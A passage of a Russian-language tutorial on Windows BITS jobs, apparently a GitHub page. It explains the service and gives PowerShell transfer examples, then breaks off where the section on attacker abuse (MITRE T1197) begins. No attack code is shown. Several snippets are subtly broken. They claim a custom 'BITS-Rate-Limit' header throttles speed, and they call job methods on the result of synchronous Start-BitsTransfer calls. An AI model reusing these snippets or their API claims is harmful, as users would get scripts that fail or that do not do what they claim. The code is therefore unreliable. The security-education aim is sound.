<article class="markdown-body entry-content container-lg" itemprop="text">
 <ul dir="auto">
  <li>
   <a href="#%D0%B2%D0%B2%D0%B5%D0%B4%D0%B5%D0%BD%D0%B8%D0%B5">
    Введение
   </a>
   <ul dir="auto">
    <li>
     <a href="#%D1%87%D1%82%D0%BE-%D1%82%D0%B0%D0%BA%D0%BE%D0%B5-bits">
      Что такое BITS?
     </a>
    </li>
    <li>
     <a href="#%D0%B7%D0%BD%D0%B0%D1%87%D0%B8%D0%BC%D0%BE%D1%81%D1%82%D1%8C-bits-jobs">
      Значимость BITS
                        Jobs
     </a>
    </li>
    <li>
     <a href="#%D1%86%D0%B5%D0%BB%D1%8C-%D1%81%D1%82%D0%B0%D1%82%D1%8C%D0%B8">
      Цель статьи
     </a>
    </li>
   </ul>
  </li>
  <li>
   <a href="#%D0%BE%D1%81%D0%BD%D0%BE%D0%B2%D1%8B-bits-%D0%B8-bits-jobs">
    Основы BITS и BITS Jobs
   </a>
   <ul dir="auto">
    <li>
     <a href="#background-intelligent-transfer-service-%D0%BE%D0%B1%D0%B7%D0%BE%D1%80">
      Background
                        Intelligent Transfer Service: обзор
     </a>
     <ul dir="auto">
      <li>
       <a href="#%D1%84%D1%83%D0%BD%D0%BA%D1%86%D0%B8%D0%B8-%D0%BF%D1%80%D0%B5%D0%B4%D0%BE%D1%81%D1%82%D0%B0%D0%B2%D0%BB%D1%8F%D0%B5%D0%BC%D1%8B%D0%B5-%D1%81%D0%BB%D1%83%D0%B6%D0%B1%D0%BE%D0%B9-bits">
        Функции,
                                предоставляемые службой BITS
       </a>
      </li>
      <li>
       <a href="#%D0%BA%D0%B0%D0%BA-%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D0%B0%D0%B5%D1%82-%D0%BF%D0%B5%D1%80%D0%B5%D0%B4%D0%B0%D1%87%D0%B0-%D1%84%D0%B0%D0%B9%D0%BB%D0%BE%D0%B2-%D1%87%D0%B5%D1%80%D0%B5%D0%B7-bits">
        Как
                                работает передача файлов через BITS
       </a>
      </li>
     </ul>
    </li>
    <li>
     <a href="#bits-jobs-%D0%BC%D0%B5%D1%85%D0%B0%D0%BD%D0%B8%D0%B7%D0%BC-%D1%80%D0%B0%D0%B1%D0%BE%D1%82%D1%8B">
      BITS
                        Jobs: механизм работы
     </a>
     <ul dir="auto">
      <li>
       <a href="#%D0%BE%D1%81%D0%BD%D0%BE%D0%B2%D0%BD%D1%8B%D0%B5-%D0%BA%D0%BE%D0%BC%D0%BF%D0%BE%D0%BD%D0%B5%D0%BD%D1%82%D1%8B-%D0%B0%D1%80%D1%85%D0%B8%D1%82%D0%B5%D0%BA%D1%82%D1%83%D1%80%D1%8B-bits">
        Основные
                                компоненты архитектуры BITS
       </a>
      </li>
      <li>
       <a href="#%D0%BF%D0%B0%D1%80%D0%B0%D0%BC%D0%B5%D1%82%D1%80%D1%8B-%D0%B7%D0%B0%D0%B4%D0%B0%D1%87-bits">
        Параметры
                                задач BITS:
       </a>
      </li>
      <li>
       <a href="#%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80%D1%8B-%D1%81%D0%BE%D0%B7%D0%B4%D0%B0%D0%BD%D0%B8%D1%8F-%D0%B7%D0%B0%D0%B4%D0%B0%D1%87-bits">
        Примеры
                                создания задач BITS:
       </a>
       <ul dir="auto">
        <li>
         <a href="#%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-1-%D0%B7%D0%B0%D0%B3%D1%80%D1%83%D0%B7%D0%BA%D0%B0-%D1%84%D0%B0%D0%B9%D0%BB%D0%B0-%D1%81-%D0%BF%D1%80%D0%BE%D0%B2%D0%B5%D1%80%D0%BA%D0%BE%D0%B9-%D0%BA%D0%BE%D0%BD%D1%82%D1%80%D0%BE%D0%BB%D1%8C%D0%BD%D0%BE%D0%B9-%D1%81%D1%83%D0%BC%D0%BC%D1%8B">
          Пример
                                        1: Загрузка файла с проверкой контрольной суммы
         </a>
        </li>
        <li>
         <a href="#%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-2-%D0%BE%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%BA%D0%B0-%D1%84%D0%B0%D0%B9%D0%BB%D0%B0-%D1%81-%D1%83%D0%B2%D0%B5%D0%B4%D0%BE%D0%BC%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5%D0%BC-%D0%BF%D0%BE-%D1%8D%D0%BB%D0%B5%D0%BA%D1%82%D1%80%D0%BE%D0%BD%D0%BD%D0%BE%D0%B9-%D0%BF%D0%BE%D1%87%D1%82%D0%B5">
          Пример
                                        2: Отправка файла с уведомлением по электронной почте
         </a>
        </li>
        <li>
         <a href="#%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-3-%D0%BF%D0%B5%D1%80%D0%B5%D0%B4%D0%B0%D1%87%D0%B0-%D1%84%D0%B0%D0%B9%D0%BB%D0%B0-%D1%81-%D0%BE%D1%82%D0%B2%D0%B5%D1%82%D0%BE%D0%BC-%D0%BE%D1%82-%D1%81%D0%B5%D1%80%D0%B2%D0%B5%D1%80%D0%B0">
          Пример
                                        3: Передача файла с ответом от сервера
         </a>
        </li>
        <li>
         <a href="#%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-4-%D0%BE%D0%B3%D1%80%D0%B0%D0%BD%D0%B8%D1%87%D0%B5%D0%BD%D0%B8%D0%B5-%D1%81%D0%BA%D0%BE%D1%80%D0%BE%D1%81%D1%82%D0%B8-%D0%BF%D0%B5%D1%80%D0%B5%D0%B4%D0%B0%D1%87%D0%B8-%D0%B4%D0%BB%D1%8F-%D0%B1%D0%BE%D0%BB%D1%8C%D1%88%D0%B8%D1%85-%D1%84%D0%B0%D0%B9%D0%BB%D0%BE%D0%B2">
          Пример
                                        4: Ограничение скорости передачи для больших файлов
         </a>
        </li>
        <li>
         <a href="#%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-5-%D0%B0%D0%B2%D1%82%D0%BE%D0%BC%D0%B0%D1%82%D0%B8%D1%87%D0%B5%D1%81%D0%BA%D0%BE%D0%B5-%D1%83%D0%B4%D0%B0%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5-%D0%B7%D0%B0%D0%B4%D0%B0%D0%BD%D0%B8%D1%8F-%D0%BF%D0%BE%D1%81%D0%BB%D0%B5-%D0%B7%D0%B0%D0%B2%D0%B5%D1%80%D1%88%D0%B5%D0%BD%D0%B8%D1%8F">
          Пример
                                        5: Автоматическое удаление задания после завершения
         </a>
        </li>
       </ul>
      </li>
     </ul>
    </li>
   </ul>
  </li>
  <li>
   <a href="#%D0%B7%D0%BB%D0%BE%D1%83%D0%BF%D0%BE%D1%82%D1%80%D0%B5%D0%B1%D0%BB%D0%B5%D0%BD%D0%B8%D0%B5-bits-jobs">
    Злоупотребление
                BITS Jobs
   </a>
   <ul dir="auto">
    <li>
     <a href="#%D0%BA%D0%B5%D0%B9%D1%81%D1%8B-%D1%80%D0%B5%D0%B0%D0%BB%D1%8C%D0%BD%D1%8B%D1%85-%D0%B0%D1%82%D0%B0%D0%BA">
      Кейсы
                        реальных атак
     </a>
     <ul dir="auto">
      <li>
       <a href="#%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-1-%D0%BC%D0%BD%D0%BE%D0%B3%D0%BE%D1%8D%D1%82%D0%B0%D0%BF%D0%BD%D0%B0%D1%8F-%D0%B0%D1%82%D0%B0%D0%BA%D0%B0-%D1%81-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5%D0%BC-bits-%D0%B4%D0%BB%D1%8F-%D0%B7%D0%B0%D0%B3%D1%80%D1%83%D0%B7%D0%BA%D0%B8-%D0%B8-%D0%B2%D1%8B%D0%BF%D0%BE%D0%BB%D0%BD%D0%B5%D0%BD%D0%B8%D1%8F-%D0%B2%D1%80%D0%B5%D0%B4%D0%BE%D0%BD%D0%BE%D1%81%D0%BD%D0%BE%D0%B3%D0%BE-%D0%BF%D0%BE">
        Пример
                                1: Многоэтапная атака с использованием BITS для загрузки и выполнения вредоносного
                                ПО
       </a>
      </li>
      <li>
       <a href="#%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-2-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5-bits-%D0%B4%D0%BB%D1%8F-%D0%BF%D0%B5%D1%80%D0%B5%D0%B4%D0%B0%D1%87%D0%B8-%D0%B4%D0%B0%D0%BD%D0%BD%D1%8B%D1%85-%D1%81-%D0%B7%D0%B0%D1%80%D0%B0%D0%B6%D1%91%D0%BD%D0%BD%D0%BE%D0%B9-%D1%81%D0%B8%D1%81%D1%82%D0%B5%D0%BC%D1%8B">
        Пример
                                2: Использование BITS для передачи данных с заражённой системы
       </a>
      </li>
      <li>
       <a href="#%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80-3-%D0%B8%D1%81%D0%BF%D0%BE%D0%BB%D1%8C%D0%B7%D0%BE%D0%B2%D0%B0%D0%BD%D0%B8%D0%B5-bits-%D0%B4%D0%BB%D1%8F-%D1%86%D0%B5%D0%BF%D0%BD%D0%BE%D0%B9-%D0%B0%D1%82%D0%B0%D0%BA%D0%B8-%D1%87%D0%B5%D1%80%D0%B5%D0%B7-api">
        Пример
                                3: Использование BITS для цепной атаки через API
       </a>
      </li>
     </ul>
    </li>
    <li>
     <a href="#%D0%BF%D1%80%D0%B5%D0%B8%D0%BC%D1%83%D1%89%D0%B5%D1%81%D1%82%D0%B2%D0%B0-%D0%B0%D1%82%D0%B0%D0%BA-%D1%87%D0%B5%D1%80%D0%B5%D0%B7-bits-jobs">
      Преимущества
                        атак через BITS Jobs
     </a>
    </li>
   </ul>
  </li>
  <li>
   <a href="#%D0%BC%D0%B5%D1%82%D0%BE%D0%B4%D1%8B-%D0%BE%D0%B1%D0%BD%D0%B0%D1%80%D1%83%D0%B6%D0%B5%D0%BD%D0%B8%D1%8F-%D0%B8-%D0%BF%D1%80%D0%BE%D1%82%D0%B8%D0%B2%D0%BE%D0%B4%D0%B5%D0%B9%D1%81%D1%82%D0%B2%D0%B8%D1%8F">
    Методы
                обнаружения и противодействия
   </a>
   <ul dir="auto">
    <li>
     <a href="#%D0%BE%D0%B1%D0%BD%D0%B0%D1%80%D1%83%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5-%D0%B0%D1%82%D0%B0%D0%BA">
      Обнаружение
                        атак
     </a>
    </li>
    <li>
     <a href="#%D0%BF%D1%80%D0%BE%D1%82%D0%B8%D0%B2%D0%BE%D0%B4%D0%B5%D0%B9%D1%81%D1%82%D0%B2%D0%B8%D0%B5">
      Противодействие
     </a>
    </li>
    <li>
     <a href="#%D0%BF%D1%80%D0%B8%D0%BC%D0%B5%D1%80%D1%8B-%D0%B8%D0%BD%D1%81%D1%82%D1%80%D1%83%D0%BC%D0%B5%D0%BD%D1%82%D0%BE%D0%B2">
      Примеры
                        инструментов
     </a>
    </li>
   </ul>
  </li>
  <li>
   <a href="#%D0%B7%D0%B0%D0%BA%D0%BB%D1%8E%D1%87%D0%B5%D0%BD%D0%B8%D0%B5">
    Заключение
   </a>
  </li>
  <li>
   <a href="#%D1%81%D1%81%D1%8B%D0%BB%D0%BA%D0%B8">
    Ссылки
   </a>
  </li>
 </ul>
 <div class="markdown-heading" dir="auto">
  <h1 class="heading-element" dir="auto" tabindex="-1">
   Введение
  </h1>
 </div>
 <div class="markdown-heading" dir="auto">
  <h2 class="heading-element" dir="auto" tabindex="-1">
   Что такое BITS?
  </h2>
 </div>
 <p dir="auto">
  Background Intelligent Transfer Service (BITS) — это служба Windows, которая позволяет приложениям
        передавать файлы между клиентом и сервером в фоновом режиме. Она оптимизирует использование сети, регулируя
        скорость передачи данных, и автоматически возобновляет прерванные загрузки.
 </p>
 <div class="markdown-heading" dir="auto">
  <h2 class="heading-element" dir="auto" tabindex="-1">
   Значимость BITS Jobs
  </h2>
 </div>
 <p dir="auto">
  BITS Jobs — это задания, которые управляют передачей файлов через BITS. Они широко используются для
        легитимных целей, таких как обновления Windows и синхронизация данных. Однако злоумышленники могут использовать
        BITS Jobs для скрытной загрузки вредоносного ПО или передачи данных, что делает их важным объектом изучения в
        кибербезопасности.
 </p>
 <div class="markdown-heading" dir="auto">
  <h2 class="heading-element" dir="auto" tabindex="-1">
   Цель статьи
  </h2>
 </div>
 <p dir="auto">
  Цель этой статьи — рассмотреть, как работает BITS, изучить его легитимные применения и понять, как
        злоумышленники могут злоупотреблять BITS Jobs. Мы также обсудим методы защиты от атак, связанных с
        использованием BITS, и их значимость для программистов и специалистов по безопасности.
 </p>
 <div class="markdown-heading" dir="auto">
  <h1 class="heading-element" dir="auto" tabindex="-1">
   Основы BITS и BITS Jobs
  </h1>
 </div>
 <div class="markdown-heading" dir="auto">
  <h2 class="heading-element" dir="auto" tabindex="-1">
   Background Intelligent Transfer Service: обзор
  </h2>
 </div>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Функции, предоставляемые службой BITS
  </h3>
 </div>
 <p dir="auto">
  Background Intelligent Transfer Service (BITS) предоставляет следующие ключевые функции:
 </p>
 <ol dir="auto">
  <li>
   <strong>
    Асинхронная передача файлов
   </strong>
   : BITS позволяет приложениям передавать файлы в фоновом режиме,
            не мешая работе пользователя.
  </li>
  <li>
   <strong>
    Оптимизация использования сети
   </strong>
   : Служба использует неиспользуемую пропускную способность
            сети, чтобы минимизировать влияние на другие приложения.
  </li>
  <li>
   <strong>
    Возобновление передачи
   </strong>
   : Если передача была прервана (например, из-за отключения сети), BITS
            автоматически возобновляет её с того места, где она остановилась.
  </li>
  <li>
   <strong>
    Управление приоритетами
   </strong>
   : Задания BITS могут быть настроены с разными уровнями приоритета,
            что позволяет управлять порядком выполнения задач.
  </li>
  <li>
   <strong>
    Поддержка безопасности
   </strong>
   : BITS использует аутентификацию и шифрование для защиты передаваемых
            данных.
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Как работает передача файлов через BITS
  </h3>
 </div>
 <p dir="auto">
  Передача файлов через BITS включает следующие этапы:
 </p>
 <ol dir="auto">
  <li>
   <strong>
    Создание задания
   </strong>
   : Приложение или скрипт создаёт задание BITS с указанием параметров, таких
            как источник и назначение файлов.
  </li>
  <li>
   <strong>
    Добавление файлов
   </strong>
   : В задание добавляются файлы, которые необходимо передать.
  </li>
  <li>
   <strong>
    Передача данных
   </strong>
   : BITS начинает передачу файлов, используя неиспользуемую пропускную
            способность сети.
  </li>
  <li>
   <strong>
    Завершение задания
   </strong>
   : После успешной передачи файлов задание завершается, и приложение
            получает уведомление.
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h2 class="heading-element" dir="auto" tabindex="-1">
   BITS Jobs: механизм работы
  </h2>
 </div>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Основные компоненты архитектуры BITS
  </h3>
 </div>
 <ol dir="auto">
  <li>
   <p dir="auto">
    <strong>
     Клиентская часть
    </strong>
    :
    <br/>
    Приложения или скрипты, которые взаимодействуют с BITS через API или командную строку, создают и
                управляют заданиями. Клиентская часть определяет параметры заданий, такие как источник, назначение,
                приоритет и ограничения.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Служба BITS
    </strong>
    :
    <br/>
    Основной компонент, который отвечает за выполнение заданий. Служба работает в фоновом режиме, управляет
                очередями заданий, регулирует использование сети и обеспечивает автоматическое возобновление прерванных
                передач.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Хранилище заданий
    </strong>
    :
    <br/>
    Все задания BITS сохраняются в локальной базе данных, что позволяет службе отслеживать их состояние и
                возобновлять выполнение после перезагрузки системы.
   </p>
  </li>
  <li>
   <p dir="auto">
    <strong>
     Интеграция с сетевыми протоколами
    </strong>
    :
    <br/>
    BITS использует стандартные сетевые протоколы, такие как HTTP и HTTPS, для передачи данных. Это
                обеспечивает совместимость с большинством серверов и сетевых инфраструктур.
   </p>
  </li>
 </ol>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Параметры задач BITS:
  </h3>
 </div>
 <p dir="auto">
  Задачи BITS (BITS Jobs) создаются с использованием API или командной строки. При создании задания
        можно указать следующие параметры:
 </p>
 <ul dir="auto">
  <li>
   <strong>
    Имя задания
   </strong>
   : Уникальный идентификатор задания.
  </li>
 </ul>
 <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
  <pre><span class="pl-c"><span class="pl-c">#</span> Указание имени задания</span>
    <span class="pl-smi">$job</span> <span class="pl-k">=</span> <span class="pl-c1">Start-BitsTransfer</span> <span class="pl-k">-</span>DisplayName <span class="pl-s"><span class="pl-pds">"</span>MyDownloadJob<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Source <span class="pl-s"><span class="pl-pds">"</span>https://example.com/file.zip<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Destination <span class="pl-s"><span class="pl-pds">"</span>C:\Downloads\file.zip<span class="pl-pds">"</span></span>
    <span class="pl-c1">Write-Host</span> <span class="pl-s"><span class="pl-pds">"</span>Имя задания: <span class="pl-k"><span class="pl-pse">$</span></span><span class="pl-pse">(</span><span class="pl-smi">$job<span class="pl-smi">.DisplayName</span></span><span class="pl-pse">)</span><span class="pl-pds">"</span></span></pre>
 </div>
 <ul dir="auto">
  <li>
   <strong>
    Тип задания
   </strong>
   : Загрузка (download), отправка (upload) или передача (upload-reply).
  </li>
 </ul>
 <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
  <pre><span class="pl-c"><span class="pl-c">#</span> Создание задания для загрузки</span>
    <span class="pl-smi">$job</span> <span class="pl-k">=</span> <span class="pl-c1">Start-BitsTransfer</span> <span class="pl-k">-</span>Source <span class="pl-s"><span class="pl-pds">"</span>https://example.com/file.zip<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Destination <span class="pl-s"><span class="pl-pds">"</span>C:\Downloads\file.zip<span class="pl-pds">"</span></span>
    <span class="pl-c1">Write-Host</span> <span class="pl-s"><span class="pl-pds">"</span>Тип задания: Download<span class="pl-pds">"</span></span></pre>
 </div>
 <p dir="auto">
  <strong>
   Различие между типами задач
  </strong>
 </p>
 <ol dir="auto">
  <li>
   <strong>
    Загрузка (Download)
   </strong>
   : Передача файлов с удалённого сервера на локальную машину.
  </li>
  <li>
   <strong>
    Отправка (Upload)
   </strong>
   : Передача файлов с локальной машины на удалённый сервер.
  </li>
  <li>
   <strong>
    Передача с ответом (Upload-Reply)
   </strong>
   : Передача файлов на сервер с последующим получением
            ответа.
  </li>
 </ol>
 <p dir="auto">
  Каждый тип задачи имеет свои особенности и используется в зависимости от требований приложения.
 </p>
 <ul dir="auto">
  <li>
   <strong>
    Приоритет
   </strong>
   : Высокий, нормальный или низкий.
  </li>
 </ul>
 <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
  <pre><span class="pl-c"><span class="pl-c">#</span> Установка приоритета задания</span>
    <span class="pl-smi">$job<span class="pl-smi">.Priority</span></span> <span class="pl-k">=</span> [<span class="pl-k">Microsoft.BackgroundIntelligentTransfer.Management.BitsJobPriority</span>]::High
    <span class="pl-c1">Write-Host</span> <span class="pl-s"><span class="pl-pds">"</span>Приоритет задания: Высокий<span class="pl-pds">"</span></span></pre>
 </div>
 <ul dir="auto">
  <li>
   <strong>
    Ограничения скорости
   </strong>
   : Максимальная скорость передачи данных.
  </li>
 </ul>
 <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
  <pre><span class="pl-c"><span class="pl-c">#</span> Установка ограничения скорости передачи</span>
    <span class="pl-smi">$job</span> <span class="pl-k">=</span> <span class="pl-c1">Start-BitsTransfer</span> <span class="pl-k">-</span>Source <span class="pl-s"><span class="pl-pds">"</span>https://example.com/file.zip<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Destination <span class="pl-s"><span class="pl-pds">"</span>C:\Downloads\file.zip<span class="pl-pds">"</span></span>
    <span class="pl-smi">$job<span class="pl-smi">.SetCustomHeaders</span></span>(<span class="pl-s"><span class="pl-pds">"</span>BITS-Rate-Limit: 1024<span class="pl-pds">"</span></span>) <span class="pl-c"><span class="pl-c">#</span> Ограничение скорости до 1024 байт/сек</span>
    <span class="pl-c1">Write-Host</span> <span class="pl-s"><span class="pl-pds">"</span>Ограничение скорости установлено<span class="pl-pds">"</span></span></pre>
 </div>
 <ul dir="auto">
  <li>
   <strong>
    Условия завершения
   </strong>
   : Условия, при которых задание считается завершённым.
  </li>
 </ul>
 <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
  <pre><span class="pl-c"><span class="pl-c">#</span> Установка условий завершения</span>
    <span class="pl-smi">$job</span> <span class="pl-k">=</span> <span class="pl-c1">Start-BitsTransfer</span> <span class="pl-k">-</span>Source <span class="pl-s"><span class="pl-pds">"</span>https://example.com/file.zip<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Destination <span class="pl-s"><span class="pl-pds">"</span>C:\Downloads\file.zip<span class="pl-pds">"</span></span>
    <span class="pl-smi">$job<span class="pl-smi">.Complete</span></span>()
    <span class="pl-c1">Write-Host</span> <span class="pl-s"><span class="pl-pds">"</span>Задание завершено<span class="pl-pds">"</span></span></pre>
 </div>
 <div class="markdown-heading" dir="auto">
  <h3 class="heading-element" dir="auto" tabindex="-1">
   Примеры создания задач BITS:
  </h3>
 </div>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Пример 1: Загрузка файла с проверкой контрольной суммы
  </h4>
 </div>
 <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
  <pre><span class="pl-c"><span class="pl-c">#</span> Создание задания для загрузки файла</span>
    <span class="pl-smi">$job</span> <span class="pl-k">=</span> <span class="pl-c1">Start-BitsTransfer</span> <span class="pl-k">-</span>Source <span class="pl-s"><span class="pl-pds">"</span>https://example.com/installer.exe<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Destination <span class="pl-s"><span class="pl-pds">"</span>C:\Temp\installer.exe<span class="pl-pds">"</span></span>
    
    <span class="pl-c"><span class="pl-c">#</span> Проверка контрольной суммы после загрузки</span>
    <span class="pl-smi">$expectedHash</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">"</span>ABC123DEF456<span class="pl-pds">"</span></span>
    <span class="pl-smi">$actualHash</span> <span class="pl-k">=</span> (<span class="pl-c1">Get-FileHash</span> <span class="pl-k">-</span>Path <span class="pl-s"><span class="pl-pds">"</span>C:\Temp\installer.exe<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Algorithm SHA256).Hash
    <span class="pl-k">if</span> (<span class="pl-smi">$expectedHash</span> <span class="pl-k">-eq</span> <span class="pl-smi">$actualHash</span>) {
        <span class="pl-c1">Write-Host</span> <span class="pl-s"><span class="pl-pds">"</span>Контрольная сумма совпадает. Файл загружен успешно.<span class="pl-pds">"</span></span>
    } <span class="pl-k">else</span> {
        <span class="pl-c1">Write-Host</span> <span class="pl-s"><span class="pl-pds">"</span>Контрольная сумма не совпадает. Файл может быть повреждён.<span class="pl-pds">"</span></span>
    }</pre>
 </div>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Пример 2: Отправка файла с уведомлением по электронной
            почте
  </h4>
 </div>
 <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
  <pre><span class="pl-c"><span class="pl-c">#</span> Создание задания для отправки файла</span>
    <span class="pl-smi">$job</span> <span class="pl-k">=</span> <span class="pl-c1">Add-BitsFile</span> <span class="pl-k">-</span>JobName <span class="pl-s"><span class="pl-pds">"</span>UploadReport<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Source <span class="pl-s"><span class="pl-pds">"</span>C:\Reports\report.pdf<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Destination <span class="pl-s"><span class="pl-pds">"</span>https://example.com/upload<span class="pl-pds">"</span></span>
    
    <span class="pl-c"><span class="pl-c">#</span> Уведомление по электронной почте после завершения</span>
    <span class="pl-c1">Register-ObjectEvent</span> <span class="pl-k">-</span>InputObject <span class="pl-smi">$job</span> <span class="pl-k">-</span>EventName JobTransferred <span class="pl-k">-</span>Action {
        <span class="pl-c1">Send-MailMessage</span> <span class="pl-k">-</span>To <span class="pl-s"><span class="pl-pds">"</span>admin@example.com<span class="pl-pds">"</span></span> <span class="pl-k">-</span>From <span class="pl-s"><span class="pl-pds">"</span>noreply@example.com<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Subject <span class="pl-s"><span class="pl-pds">"</span>Файл успешно отправлен<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Body <span class="pl-s"><span class="pl-pds">"</span>Отчёт загружен на сервер.<span class="pl-pds">"</span></span>
    }
    <span class="pl-smi">$job<span class="pl-smi">.Resume</span></span>()</pre>
 </div>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Пример 3: Передача файла с ответом от сервера
  </h4>
 </div>
 <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
  <pre><span class="pl-c"><span class="pl-c">#</span> Создание задания для передачи файла с ответом</span>
    <span class="pl-smi">$job</span> <span class="pl-k">=</span> <span class="pl-c1">Start-BitsTransfer</span> <span class="pl-k">-</span>Source <span class="pl-s"><span class="pl-pds">"</span>C:\Data\request.json<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Destination <span class="pl-s"><span class="pl-pds">"</span>https://api.example.com/upload-reply<span class="pl-pds">"</span></span> <span class="pl-k">-</span>TransferType UploadReply
    
    <span class="pl-c"><span class="pl-c">#</span> Сохранение ответа сервера</span>
    <span class="pl-smi">$job<span class="pl-smi">.SetReplyFileName</span></span>(<span class="pl-s"><span class="pl-pds">"</span>C:\Data\response.json<span class="pl-pds">"</span></span>)
    <span class="pl-smi">$job<span class="pl-smi">.Resume</span></span>()
    
    <span class="pl-c"><span class="pl-c">#</span> Проверка ответа</span>
    <span class="pl-k">if</span> (<span class="pl-c1">Test-Path</span> <span class="pl-s"><span class="pl-pds">"</span>C:\Data\response.json<span class="pl-pds">"</span></span>) {
        <span class="pl-c1">Write-Host</span> <span class="pl-s"><span class="pl-pds">"</span>Ответ от сервера сохранён в response.json<span class="pl-pds">"</span></span>
    } <span class="pl-k">else</span> {
        <span class="pl-c1">Write-Host</span> <span class="pl-s"><span class="pl-pds">"</span>Не удалось получить ответ от сервера.<span class="pl-pds">"</span></span>
    }</pre>
 </div>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Пример 4: Ограничение скорости передачи для больших файлов
  </h4>
 </div>
 <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
  <pre><span class="pl-c"><span class="pl-c">#</span> Создание задания с ограничением скорости</span>
    <span class="pl-smi">$job</span> <span class="pl-k">=</span> <span class="pl-c1">Start-BitsTransfer</span> <span class="pl-k">-</span>Source <span class="pl-s"><span class="pl-pds">"</span>https://example.com/largefile.zip<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Destination <span class="pl-s"><span class="pl-pds">"</span>C:\Downloads\largefile.zip<span class="pl-pds">"</span></span>
    <span class="pl-smi">$job<span class="pl-smi">.SetCustomHeaders</span></span>(<span class="pl-s"><span class="pl-pds">"</span>BITS-Rate-Limit: 1048576<span class="pl-pds">"</span></span>) <span class="pl-c"><span class="pl-c">#</span> Ограничение скорости до 1 МБ/сек</span>
    <span class="pl-smi">$job<span class="pl-smi">.Resume</span></span>()
    <span class="pl-c1">Write-Host</span> <span class="pl-s"><span class="pl-pds">"</span>Задание с ограничением скорости создано.<span class="pl-pds">"</span></span></pre>
 </div>
 <div class="markdown-heading" dir="auto">
  <h4 class="heading-element" dir="auto" tabindex="-1">
   Пример 5: Автоматическое удаление задания после завершения
  </h4>
 </div>
 <div class="highlight highlight-source-powershell notranslate position-relative overflow-auto" dir="auto">
  <pre><span class="pl-c"><span class="pl-c">#</span> Создание задания для загрузки файла</span>
    <span class="pl-smi">$job</span> <span class="pl-k">=</span> <span class="pl-c1">Start-BitsTransfer</span> <span class="pl-k">-</span>Source <span class="pl-s"><span class="pl-pds">"</span>https://example.com/tempfile.zip<span class="pl-pds">"</span></span> <span class="pl-k">-</span>Destination <span class="pl-s"><span class="pl-pds">"</span>C:\Temp\tempfile.zip<span class="pl-pds">"</span></span>
    
    <span class="pl-c"><span class="pl-c">#</span> Удаление задания после завершения</span>
    <span class="pl-c1">Register-ObjectEvent</span> <span class="pl-k">-</span>InputObject <span class="pl-smi">$job</span> <span class="pl-k">-</span>EventName JobTransferred <span class="pl-k">-</span>Action {
        <span class="pl-c1">Remove-BitsTransfer</span> <span class="pl-k">-</span>BitsJob <span class="pl-smi">$job</span>
        <span class="pl-c1">Write-Host</span> <span class="pl-s"><span class="pl-pds">"</span>Задание удалено после завершения.<span class="pl-pds">"</span></span>
    }
    <span class="pl-smi">$job<span class="pl-smi">.Resume</span></span>()</pre>
 </div>
 <div class="markdown-heading" dir="auto">
  <h1 class="heading-element" dir="auto" tabindex="-1">
   Злоупотребление BITS Jobs
  </h1>
 </div>
 <p dir="auto">
  Техника
  <a href="https://attack.mitre.org/techniques/T1197/" rel="nofollow">
   T1197
  </a>
  из MITRE
        ATT&amp;CK описывает использование BITS Jobs для выполнения вредоносного кода. Злоумышленники могут создавать
        задания BITS для загрузки и выполнения вредоносных файлов, а также для обеспечения устойчивости атак. Эта
